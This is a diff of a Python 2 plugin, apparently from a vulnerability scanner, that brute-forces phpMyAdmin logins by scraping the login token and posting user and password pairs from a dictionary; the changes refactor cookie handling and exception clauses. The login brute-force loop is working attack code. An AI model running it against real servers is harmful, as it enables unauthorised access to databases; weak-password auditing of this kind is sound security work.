@@ -1,7 +1,6 @@
 # coding=utf-8
 import urllib2
 import re
-import cookielib
 
 def get_plugin_info():
     plugin_info = {
@@ -32,21 +31,18 @@ def check(ip, port, timeout):
                 url = 'http://' + ip + ":" + str(port) + "/phpmyadmin/index.php"
             else:
                 return
-    except Exception, e:
-        return
+    except:
+        pass
     for user in user_list:
         for password in PASSWORD_DIC:
             try:
-                cj = cookielib.CookieJar()
-                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-                urllib2.install_opener(opener)
-                res_html = urllib2.urlopen(url, timeout=timeout).read()
-                token = re.search('name="token" value="(.*?)" \/>', res_html)
+                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
+                res_html = opener.open(url, timeout=timeout).read()
+                token = re.search('name="token" value="(.*?)" />', res_html)
                 token_hash = urllib2.quote(token.group(1))
                 postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                 user, password, token_hash)
-                request = urllib2.Request(url, postdata)
-                res = urllib2.urlopen(request, timeout=timeout)
+                res = opener.open(url,postdata, timeout=timeout)
                 res_html = res.read()
                 for flag in flag_list:
                     if flag in res_html:
@@ -54,5 +50,5 @@ def check(ip, port, timeout):
             except urllib2.URLError, e:
                 error_i += 1
                 if error_i >= 3: return
-            except:
+            except Exception,e:
                 return
